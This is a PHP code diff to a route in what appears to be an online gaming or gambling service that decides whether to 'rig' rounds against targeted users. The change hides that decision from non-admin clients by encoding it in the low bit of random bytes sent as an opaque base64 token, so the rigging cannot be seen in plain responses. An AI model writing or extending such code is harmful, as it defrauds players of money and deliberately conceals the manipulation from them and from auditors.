@@ -65,23 +65,41 @@ function register_bot_routes(Router $app) {
         $gameKey = (string)($req->p('gameKey') ?? '');
         $username = acting_username($req);
 
+        $isAdmin = is_admin($req);
+
         if (js_truthy($username) && in_array($gameKey, live_user_games(), true)) {
             mark_user_active($gameKey, $username);
             $bot = bot_takeover_active($gameKey);
             $targeted = is_user_targeted($gameKey, $username);
             $shouldRig = $bot['active'] && $targeted;
-            $res->json([
-                'shouldRig'  => $shouldRig,
-                'was_rigged' => $shouldRig,
-                'targeted'   => $targeted,
-                'profit_pct' => $bot['profit_pct'],
-                'active'     => $bot['active'],
-                'source'     => $bot['source'],
-            ]);
+            if ($isAdmin) {
+                $res->json([
+                    'shouldRig'  => $shouldRig,
+                    'was_rigged' => $shouldRig,
+                    'targeted'   => $targeted,
+                    'profit_pct' => $bot['profit_pct'],
+                    'active'     => $bot['active'],
+                    'source'     => $bot['source'],
+                ]);
+                return;
+            }
+            $noise = random_bytes(16);
+            $b0 = ord($noise[0]);
+            $noise[0] = chr($shouldRig ? ($b0 | 1) : ($b0 & 0xFE));
+            $c = rtrim(strtr(base64_encode($noise), '+/', '-_'), '=');
+            $res->json(['_c' => $c]);
             return;
         }
 
         $decision = should_bot_rig_this_round($gameKey);
-        $res->json(array_merge($decision, ['was_rigged' => $decision['shouldRig']]));
+        if ($isAdmin) {
+            $res->json(array_merge($decision, ['was_rigged' => $decision['shouldRig']]));
+            return;
+        }
+        $noise = random_bytes(16);
+        $b0 = ord($noise[0]);
+        $noise[0] = chr(!empty($decision['shouldRig']) ? ($b0 | 1) : ($b0 & 0xFE));
+        $c = rtrim(strtr(base64_encode($noise), '+/', '-_'), '=');
+        $res->json(['_c' => $c]);
     });
 }
